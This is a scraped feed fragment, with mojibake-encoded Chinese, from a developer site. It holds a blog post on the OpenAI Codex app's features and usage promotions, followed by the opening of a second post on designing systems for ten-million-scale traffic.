            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1552933235470589/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    æ‘†çƒ‚å·¥ç¨‹å¸ˆ
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-04T08:56:28.000Z" title="Wed Feb 04 2026 08:56:28 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-04
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»3åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>æœ€è¿‘ OpenAI çš„ Codex æ›´æ–°äº†ï¼Œå¹¶ä¸”å‘å¸ƒäº† Codex åº”ç”¨ç‰ˆï¼ˆç›®å‰ä»…æ”¯æŒ mac ç”µè„‘ï¼Œ windows/linux ç‰ˆæœ¬éƒ½æ²¡æœ‰æ¨å‡ºï¼‰ã€‚</p>
<p>è¿™æ¬¡å‘å¸ƒçš„ <strong>Codex åº”ç”¨ä¸æ˜¯ IDEï¼Œä¸æ˜¯ CLIï¼Œè€Œæ˜¯ä¸€ä¸ªä»£ç†å¼ç¼–ç¨‹çš„æŒ‡æŒ¥ä¸­å¿ƒ</strong>ã€‚</p>
<p>åŒæ—¶ä¹Ÿå¼€å¯äº†ä¿ƒé”€æ´»åŠ¨ï¼Œåªè¦å®‰è£… Codex åº”ç”¨ç‰ˆå°±å¯ä»¥äº«å—ï¼š</p>
<ul>
<li>ChatGPT å…è´¹ç”¨æˆ· å’Œ Go ç”¨æˆ· å¯ä»¥è·å¾— 1ä¸ªæœˆçš„ Codex ä½¿ç”¨æƒ</li>
<li>æ‰€æœ‰ä»˜è´¹è®¡åˆ’ï¼ˆProã€ Plusã€ Businessï¼‰ç”¨æˆ·éƒ½è·å¾— Codex 2å€çš„é¢åº¦ï¼ŒæŒç»­2ä¸ªæœˆã€‚</li>
</ul>
<p>æˆ‘ç«‹é©¬ä» vscode çš„ codex è½¬ç§»åˆ° codex åº”ç”¨ï¼Œé¢åº¦ä¸ä»…å……è¶³ï¼Œ<strong>è€Œä¸” GPT-5.2-Codex å’Œ GPT-5.2 é€Ÿåº¦ä¹Ÿæå‡äº†40%ã€‚</strong></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7f21a830129b46308c7755781bc9c32d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5pGG54OC5bel56iL5biI:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770800188&amp;x-signature=6eKNPD8YupxO4NK89DGOLUjzH1w%3D" alt="" loading="lazy"/></p>
<p>å½“ç„¶è¿™æ¬¡é¢åº¦å’Œé€Ÿåº¦çš„æå‡ä¸å±€é™äº Codex åº”ç”¨ï¼Œåœ¨ Codex CLI åŒæ ·å¯ä»¥äº«å—ã€‚</p>
<h2 data-id="heading-0">é¢åº¦å’Œé€Ÿåº¦æå‡ã€Juice ä¸‹é™</h2>
<p>ä½†æ˜¯é€Ÿåº¦çš„æå‡æœ‰ç‚¹ä¸å¯¹åŠ²ï¼Œå› ä¸º Codex å…è´¹ç”¨æˆ·çš„å¢é•¿ï¼Œä¸ºäº†å¹³è¡¡è®¡ç®—èµ„æºï¼Œ<strong>æ¨ç†çš„ Juice å€¼ ä¹Ÿä¸‹é™äº†ä¸€åŠ</strong>ï¼Œä»è€Œæå‡äº† 40% çš„é€Ÿåº¦ ï¼Ÿ</p>
<p>ä¹Ÿå°±æ˜¯ Codex å¯èƒ½ä¼šæ—¶ä¸æ—¶å‡ºç°æ‡’æƒ°çš„è¡Œä¸ºï¼Œä¸ä¼šè¯»å–æ›´å¤šçš„æ–‡ä»¶å†…å®¹ï¼Œè€Œæ˜¯å¿«é€Ÿçš„è¾“å‡ºå†™å®Œä»£ç äº†ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6a13105dbb484f8fa64e11514fdc7374~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5pGG54OC5bel56iL5biI:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770800188&amp;x-signature=Y1WXjZKAXDibKSZd0JVOPx4RMMU%3D" alt="" loading="lazy"/></p>
<p>å…è´¹ç‰ˆ å’Œ Go ç‰ˆæœ¬çš„ Juice å€¼ä¸€ç›´å¾ˆä½çš„ï¼Œ<strong>å¦‚æœä½ éœ€è¦ä½“éªŒå¥½ä¸€äº›çš„ Codex ç¼–ç¨‹ï¼Œå»ºè®®é€‰æ‹©æ¨¡å‹ GPT-5.2-Codexï¼Œæ¨ç†é€‰æ‹© è¶…é«˜ï¼ˆExtra Highï¼‰</strong>ï¼Œä»˜è´¹ç”¨æˆ·çš„é¢åº¦å·²ç»ç¿»å€äº†ï¼Œé€‰æ‹©è¶…é«˜æ¨¡å¼å¯ä»¥ä½¿ç”¨ä¸€æ®µæ—¶é—´ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/38d5f031e7594e5ca55cfd67dbba4175~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5pGG54OC5bel56iL5biI:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770800188&amp;x-signature=TKRcVsFlLy6cQSYd4bh9YJdYQPY%3D" alt="" loading="lazy"/></p>
<p>å¯¹äº†ï¼Œå¦‚æœä½ ä¸çŸ¥é“å›½å†…å¦‚ä½•å‡çº§è‡ªå·±çš„ ChatGPT çš„è¯ï¼Œå¯ä»¥çœ‹ä¸€ä¸‹è¿™ä¸ªä¸€é”®å‡çº§ç³»ç»Ÿ:</p>
<blockquote>
<p>GPT å‡çº§ç³»ç»Ÿï¼š<strong><a href="https://link.juejin.cn?target=https%3A%2F%2Fupchatgpt.com" target="_blank" title="https://upchatgpt.com" ref="nofollow noopener noreferrer">upchatgpt.com</a></strong></p>
</blockquote>
<p>ç°åœ¨å¤–é¢çš„ GPT å‡çº§é±¼é¾™æ··æ‚ï¼Œå¤ªå¤šå˜¿å……å’Œ0å…ƒè´­äº†ï¼Œå¾ˆå®¹æ˜“å°±å¯¼è‡´ä½ çš„è´¦å·è¢«å°äº†ã€‚</p>
<p>æ‰¾ä¸€ä¸ªæ­£è§„æ¸ é“ï¼Œç¨³å®šå……å€¼çš„å¹¶ä¸ç®€å•äº†ï¼Œè®¤å‡†å½“å‰è¿™ä¸ªç³»ç»Ÿï¼Œå·²ç»ç¨³å®šè¿è¡Œäº†å¥½é•¿æ—¶é—´ã€‚</p>
<h2 data-id="heading-1">Codex åº”ç”¨çš„æ–°åŠŸèƒ½ï¼š</h2>
<ul>
<li>å†…ç½®å·¥ä½œæ ‘ï¼ˆworktreeï¼‰ï¼šä½¿å¤šä¸ªä»£ç†èƒ½å¤Ÿæ— å†²çªåœ°å·¥ä½œ</li>
<li>è®¡åˆ’æ¨¡å¼ï¼šè¾“å…¥ /plan ä¸ Codex è¿›è¡Œæ¥å›äº¤æµ</li>
<li>é£æ ¼ï¼šå¯ä»¥é€‰æ‹©é€‚åˆä½ é£æ ¼çš„äº’åŠ¨æ–¹å¼</li>
<li>Skillsï¼šè¿æ¥ä½ å·²ä½¿ç”¨çš„skillï¼Œå¹¶è¶…è¶Šç¼–å†™ä»£ç </li>
<li>è‡ªåŠ¨åŒ–ï¼šåœ¨åå°å§”æ´¾é‡å¤çš„å‘¨æœŸæ€§ä»»åŠ¡</li>
</ul>
<p>åœ¨ Codex çš„åº”ç”¨é‡Œï¼Œä½ å¯ä»¥åˆ›å»º<strong>è‡ªåŠ¨åŒ–ä»»åŠ¡</strong>ã€‚å…ˆæŠŠè§„åˆ™å’Œç›®æ ‡è®¾ç½®å¥½ï¼Œä¹‹åå¾ˆå¤šäº‹æƒ… Codex å¯ä»¥<strong>ä¸ç”¨ä½ æ¯æ¬¡éƒ½å¼€å£æé†’</strong>ï¼Œè‡ªå·±æŒ‰æ—¶/æŒ‰æ¡ä»¶å»æ‰§è¡Œã€‚</p>
<p>å®ƒç‰¹åˆ«é€‚åˆåšä¸€äº›â€œæ¯å¤©éƒ½è¦åšã€åˆå¾ˆè€—ç²¾åŠ›â€çš„å·¥ç¨‹æ‚æ´»ï¼Œæ¯”å¦‚ï¼š</p>
<ul>
<li>é—®é¢˜åˆ†æµï¼šæ–°æ¥çš„ issue / å·¥å•å…ˆå¸®ä½ åˆ†ç±»ã€æ‰“æ ‡ç­¾ã€åˆ†é…è´Ÿè´£äºº</li>
<li>å‘Šè­¦ç›‘æ§ï¼šçº¿ä¸Šä¸€æŠ¥é”™æˆ–æŒ‡æ ‡å¼‚å¸¸ï¼Œè‡ªåŠ¨é€šçŸ¥åˆ°å¯¹åº”ç¾¤/è´Ÿè´£äººï¼Œå¹¶é™„ä¸Šæ’æŸ¥çº¿ç´¢</li>
<li>CI/CDï¼šä»£ç ä¸€åˆå¹¶å°±è‡ªåŠ¨è·‘æµ‹è¯•ã€æ„å»ºã€å‘å¸ƒï¼Œå¤±è´¥äº†è¿˜èƒ½æŠŠåŸå› æ€»ç»“å‡ºæ¥</li>
</ul>
<p><strong>æŠŠé‡å¤æ€§çš„æ—¥å¸¸ç»´æŠ¤äº¤ç»™ Codexï¼Œä½ æŠŠæ³¨æ„åŠ›ç•™ç»™çœŸæ­£çš„å¼€å‘å’Œè®¾è®¡å†³ç­–ã€‚</strong></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/03eecd6b15d44aa2a17042cb14b2bf71~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5pGG54OC5bel56iL5biI:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770800188&amp;x-signature=8SMGlE5HshPAxfdBa8UmKtI8oN0%3D" alt="" loading="lazy"/></p>
<p>ä½ è¿˜å¯ä»¥ç»™ Codex åˆ›å»ºå„ç§ Skillï¼ˆæŠ€èƒ½ï¼‰ã€‚ <strong>è®© Codex ä¸åªâ€œå†™ä»£ç â€ï¼Œè€Œæ˜¯â€œå‚ä¸æŠŠäº§å“åšå‡ºæ¥â€ã€‚</strong></p>
<p>æŠŠå›¢é˜Ÿå¸¸ç”¨çš„å·¥ä½œæ–¹å¼ã€æ ‡å‡†æµç¨‹ã€è¾“å‡ºæ ¼å¼ï¼Œåšæˆä¸€å¥—â€œå¯å¤ç”¨èƒ½åŠ›â€ï¼Œè®©å®ƒæ¯æ¬¡éƒ½æŒ‰ä½ ä»¬çš„ä¹ æƒ¯æ¥åšäº‹ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f18737d568564560a51010ac4633a5b1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5pGG54OC5bel56iL5biI:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770800188&amp;x-signature=N0TSnEpg%2BMh5IexHBfAEzaDqQaM%3D" alt="" loading="lazy"/></p>
<p>å¹³æ—¶ç¼–ç¨‹æ—¶ï¼Œç»å¸¸ç¢°åˆ° Codex è¯¢é—®ä½ çš„æƒé™æ—¶ï¼Œä½ è§‰å¾—éº»çƒ¦çš„è¯ï¼Œå¯ä»¥å¼€å¯ <code>full access</code> ç»™ä»–å…¨éƒ¨è®¿é—®çš„æƒé™ï¼Œåç»­å°±ä¼šä¸€ç›´è¿è¡Œç¼–ç ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/95ac1b0e7f354934b0d43423f21cbc7c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5pGG54OC5bel56iL5biI:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770800188&amp;x-signature=UgJYGrFDdmxG50%2BiFS6gzu5MpNY%3D" alt="" loading="lazy"/></p>
<p>Codex åŸºäºä¸€ä¸ªç®€å•çš„å‰æï¼šæ‰€æœ‰äº‹ç‰©éƒ½ç”±ä»£ç æ§åˆ¶ã€‚æ™ºèƒ½ä½“åœ¨æ¨ç†å’Œç”Ÿæˆä»£ç æ–¹é¢è¶Šå‡ºè‰²ï¼Œå®ƒåœ¨æ‰€æœ‰å½¢å¼çš„æŠ€æœ¯å’ŒçŸ¥è¯†å‹å·¥ä½œä¸­å°±è¶Šæœ‰èƒ½åŠ›ã€‚</p>
<p>Codex æƒ³æŠŠâ€œå¾ˆèªæ˜ä½†ä¸å¥½ç”¨çš„æ¨¡å‹â€ï¼Œå˜æˆâ€œä½ èƒ½è½»æ¾æŒ‡æŒ¥ã€å¯ç›‘ç£ã€èƒ½ç¨³å®šäº§å‡ºå¹¶æŠŠä»£ç ä¸€è·¯æ¨åˆ°äº¤ä»˜â€çš„å·¥ä½œå‹æ™ºèƒ½ä½“ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[å¦‚ä½•è®¾è®¡ä¸€ä¸ªæ‰›ä½åƒä¸‡çº§æµé‡çš„ç³»ç»Ÿï¼Ÿ]]></title>    <link>https://juejin.cn/post/7602497125268750342</link>    <guid>https://juejin.cn/post/7602497125268750342</guid>    <pubDate>2026-02-04T02:23:25.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7602497125268750342" data-draft-id="7602512064976551999" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="å¦‚ä½•è®¾è®¡ä¸€ä¸ªæ‰›ä½åƒä¸‡çº§æµé‡çš„ç³»ç»Ÿï¼Ÿ"/> <meta itemprop="keywords" content="åç«¯"/> <meta itemprop="datePublished" content="2026-02-04T02:23:25.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="è‹ä¸‰è¯´æŠ€æœ¯"/> <meta itemprop="url" content="https://juejin.cn/user/465848661970824"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            å¦‚ä½•è®¾è®¡ä¸€ä¸ªæ‰›ä½åƒä¸‡çº§æµé‡çš„ç³»ç»Ÿï¼Ÿ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/465848661970824/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    è‹ä¸‰è¯´æŠ€æœ¯
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-04T02:23:25.000Z" title="Wed Feb 04 2026 02:23:25 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-04
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»11åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">å‰è¨€</h2>
<p>å¤§å®¶å¥½ï¼Œæˆ‘æ˜¯è‹ä¸‰ã€‚</p>
<p>ä»Šå¤©è·Ÿå¤§å®¶èŠä¸€ä¸‹å¾ˆå¤šå°ä¼™ä¼´éƒ½æ¯”è¾ƒå…³å¿ƒçš„è¯é¢˜ï¼šå¦‚ä½•è®¾è®¡ä¸€ä¸ªæ‰›ä½åƒä¸‡çº§æµé‡çš„ç³»ç»Ÿï¼Ÿ</p>
<p>è¿™ä¸ªè¯é¢˜æ— è®ºåœ¨é¢è¯•ï¼Œè¿˜æ˜¯åœ¨å®é™…å·¥ä½œä¸­ï¼Œéƒ½éå¸¸å¸¸è§ã€‚</p>
<p>ä»Šå¤©è¿™ç¯‡æ–‡ç« å°±ä¸“é—¨è·Ÿå¤§å®¶èŠèŠè¿™ä¸ªé—®é¢˜ï¼Œå¸Œæœ›å¯¹ä½ ä¼šæœ‰æ‰€å¸®åŠ©ã€‚</p>
<h2 data-id="heading-1">01 ä¸‰ä¸ªå…³é”®ç‚¹</h2>
<p>åœ¨æ·±å…¥æŠ€æœ¯ç»†èŠ‚å‰ï¼Œæˆ‘ä»¬å…ˆè¦æ˜ç¡®è®¾è®¡åƒä¸‡çº§ç³»ç»Ÿçš„æ ¸å¿ƒç›®æ ‡ã€‚</p>
<p>è®°ä½è¿™ä¸‰ä¸ªå…³é”®ç‚¹ï¼š</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/62a6014e62dc49daa091c87ad5c031ce~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6IuP5LiJ6K-05oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770776606&amp;x-signature=XBYdJ4pk7dm0R78A0ZGYcRXtMr0%3D" alt="" loading="lazy"/></p>
<p><strong>1. é«˜æ€§èƒ½</strong>ï¼šä¸æ˜¯ç®€å•è¿½æ±‚å¿«ï¼Œè€Œæ˜¯è¦åœ¨ä¿è¯æ­£ç¡®æ€§çš„å‰æä¸‹ï¼Œç”¨æœ‰é™çš„èµ„æºå¤„ç†å°½å¯èƒ½å¤šçš„è¯·æ±‚ã€‚æˆ‘ä»¬çš„ç›®æ ‡æ˜¯æ ¸å¿ƒæ¥å£P99å“åº”æ—¶é—´ä½äº100æ¯«ç§’ï¼Œå•æœºQPSä¸ä½äº5000ã€‚</p>
<p><strong>2. é«˜å¯ç”¨</strong>ï¼šç³»ç»Ÿéœ€è¦å…·å¤‡æ•…éšœè‡ªæ„ˆèƒ½åŠ›ã€‚æˆ‘ä»¬è¿½æ±‚çš„æ˜¯â€œä¸¤ä¸ª9â€æ‰“åº•ï¼Œâ€œä¸‰ä¸ª9â€èµ·æ­¥ï¼Œâ€œå››ä¸ª9â€åŠªåŠ›çš„ç›®æ ‡ï¼ˆå³99.99%å¯ç”¨æ€§ï¼Œå…¨å¹´ä¸å¯ç”¨æ—¶é—´ä¸è¶…è¿‡53åˆ†é’Ÿï¼‰ã€‚</p>
<p><strong>3. å¯æ‰©å±•</strong>ï¼šç³»ç»Ÿè¦èƒ½éšç€ä¸šåŠ¡å¢é•¿è€Œå¹³æ»‘æ‰©å±•ï¼Œä¸”æ‰©å±•æˆæœ¬è¦å¯æ§ã€‚è¿™é‡ŒåŒ…æ‹¬æ°´å¹³æ‰©å±•ï¼ˆåŠ æœºå™¨ï¼‰å’Œå‚ç›´æ‰©å±•ï¼ˆä¼˜åŒ–å•æœºæ€§èƒ½ï¼‰ä¸¤ä¸ªç»´åº¦ã€‚</p>
<h2 data-id="heading-2">02 æ¶æ„æ¼”è¿›ï¼šä»å•ä½“åˆ°åƒä¸‡çº§çš„å››æ­¥èµ°</h2>
